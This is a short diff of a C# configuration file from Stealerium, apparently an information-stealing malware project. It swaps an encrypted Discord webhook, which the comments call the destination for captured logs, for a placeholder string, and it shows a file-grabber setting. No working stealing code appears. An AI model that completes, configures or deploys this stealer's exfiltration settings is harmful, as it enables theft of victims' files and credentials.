@@ -65,9 +65,7 @@ namespace Stealerium
         // File grabber:
         public static string GrabberModule = "--- Grabber ---";
 
-        // Discord Webhook where to send captured logs
-        public static string Webhook =
-            "ENCRYPTED:fleaTKsR0trQiaWh0H+vOvHR4WDn0LEpdxH+edudpJFgHk0gqzZqQCrz+uijeyRD9bd90K68CTHNtovE8WK18CnFZZT8xgGBmQSEPuAUSPDHQqgVOeILB5awg4etFhtwJlPmQhKwgLhRgNNKFka8/ekJmadm1C0L2jqQNBRG8Bg=";
+        public static string Webhook = "--- Webhook ---";
 #endif
 
         // Discord Webhook bot avatar
